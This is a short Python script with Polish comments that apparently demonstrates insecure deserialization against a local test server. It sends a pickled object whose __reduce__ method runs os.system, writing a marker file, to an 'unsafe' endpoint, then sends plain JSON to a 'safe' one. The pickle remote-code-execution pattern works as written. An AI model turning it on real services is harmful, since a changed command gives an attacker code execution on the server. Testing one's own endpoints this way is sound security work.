import pickle
import requests


class MaliciousPayload:
    def __reduce__(self):
        import os
        return (os.system, ('echo "Test" > ./rce_test.txt',))

def send_pickle(url):
    """Wysyła dane pickle do niebezpiecznego endpointu"""
    payload = MaliciousPayload()
    serialized = pickle.dumps(payload)
    
    headers = {'Content-Type': 'application/octet-stream'}
    
    response = requests.post(url, data=serialized, headers=headers)
    
    print(f"Status dla {url}:", response.status_code)
    print("Odpowiedź:", response.text)

url_unsafe = "http://localhost:8000/api/unsafe-deserialize/"
send_pickle(url_unsafe)  

import json
import requests

def send_json(url):
    """Wysyła dane JSON do bezpiecznego endpointu"""
    data = {"test": "safe_data"}  
    
    headers = {'Content-Type': 'application/json'}
    response = requests.post(url, data=json.dumps(data), headers=headers)
    
    print(f"Status dla {url}:", response.status_code)
    print("Odpowiedź:", response.text)


url_safe = "http://localhost:8000/api/safe-deserialize/"


send_json(url_safe)    